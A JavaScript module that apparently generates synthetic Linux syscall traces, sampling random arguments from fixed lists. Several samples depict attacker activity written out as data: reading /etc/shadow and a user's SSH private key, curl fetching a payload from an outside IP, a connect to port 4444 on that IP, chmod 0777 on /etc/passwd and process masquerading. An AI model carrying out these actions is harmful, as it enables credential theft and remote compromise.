export const SYSCALL_POOL = [
  'openat',
  'read',
  'write',
  'close',
  'execve',
  'mmap',
  'mprotect',
  'socket',
  'connect',
  'bind',
  'listen',
  'accept',
  'fork',
  'clone',
  'kill',
  'ptrace',
  'chmod',
  'chown',
  'unlink',
  'stat',
  'lstat',
  'ioctl',
  'sendto',
  'recvfrom',
  'prctl',
  'access',
]

const openatArgs = [
  'AT_FDCWD, "/proc/self/mem", O_RDWR',
  'AT_FDCWD, "/etc/shadow", O_RDONLY',
  'AT_FDCWD, "/var/log/auth.log", O_RDONLY',
  'AT_FDCWD, "/home/user/.ssh/id_rsa", O_RDONLY',
  'AT_FDCWD, "/tmp/payload.sh", O_WRONLY|O_CREAT',
]

const execveArgs = [
  '"/bin/bash", ["-c", "whoami"]',
  '"/usr/bin/python3", ["exploit.py"]',
  '"/usr/bin/curl", ["-fsSL", "http://45.33.32.156/payload"]',
  '"/usr/bin/node", ["server.js"]',
]

const mprotectArgs = [
  '0x7f1a2b3c4000, 4096, PROT_READ|PROT_WRITE',
  '0x7f9c1d00a000, 4096, PROT_READ|PROT_WRITE|PROT_EXEC',
]

const socketArgs = ['AF_INET, SOCK_STREAM, IPPROTO_TCP', 'AF_INET, SOCK_DGRAM, IPPROTO_UDP']

const connectArgs = [
  '3, {AF_INET, 45.33.32.156:4444}, 16',
  '3, {AF_INET, 10.0.0.5:80}, 16',
  '3, {AF_INET, 172.16.0.10:443}, 16',
]

const killArgs = ['pid=1, SIGKILL', 'pid=2891, SIGTERM', 'pid=1234, SIGINT']

const ptraceArgs = ['PTRACE_ATTACH, 1234, NULL, NULL', 'PTRACE_ATTACH, 2891, NULL, NULL']

const chmodArgs = ['"/etc/passwd", 0777', '"/etc/ssh/sshd_config", 0666', '"/tmp/payload.sh", 0777']

const statArgs = ['"/etc/passwd", {st_mode=S_IFREG|0644, ...}', '"/var/log/auth.log", {...}', '"/home/user/.bashrc", {...}']

const simpleArgs = {
  read: ['3, "....", 4096', '4, "....", 1024'],
  write: ['1, "....", 64', '2, "....", 128'],
  close: ['3', '4', '5'],
  mmap: ['NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0'],
  bind: ['3, {AF_INET, 0.0.0.0:80}, 16', '3, {AF_INET, 127.0.0.1:8080}, 16'],
  listen: ['3, 128', '3, 511'],
  accept: ['3, {AF_INET, 10.0.0.8:53321}, 16'],
  fork: [''],
  clone: ['child_stack=0x0, flags=CLONE_VM|CLONE_FS|CLONE_FILES'],
  chown: ['"/etc/passwd", 0, 0', '"/var/www/html", 33, 33'],
  unlink: ['"/tmp/payload.sh"', '"/tmp/.X11-unix/X0"'],
  lstat: ['"/etc/ld.so.preload", {...}', '"/home/user/.ssh/authorized_keys", {...}'],
  ioctl: ['3, TCGETS, 0x7ffd...'],
  sendto: ['3, "....", 42, 0, {AF_INET, 10.0.0.5:53}, 16'],
  recvfrom: ['3, "....", 128, 0, {AF_INET, 10.0.0.5:53}, 16'],
  prctl: ['PR_SET_DUMPABLE, 0', 'PR_SET_NAME, "kworker/u8:2"'],
  access: ['"/etc/shadow", R_OK', '"/usr/bin/sudo", X_OK'],
}

export function sampleArgs(syscall, rng) {
  const pick = (arr) => arr[Math.floor(rng() * arr.length)]

  if (syscall === 'openat') return pick(openatArgs)
  if (syscall === 'execve') return pick(execveArgs)
  if (syscall === 'socket') return pick(socketArgs)
  if (syscall === 'connect') return pick(connectArgs)
  if (syscall === 'kill') return pick(killArgs)
  if (syscall === 'ptrace') return pick(ptraceArgs)
  if (syscall === 'chmod') return pick(chmodArgs)
  if (syscall === 'mprotect') return pick(mprotectArgs)
  if (syscall === 'stat') return pick(statArgs)

  const list = simpleArgs[syscall]
  if (!list) return ''
  return pick(list)
}

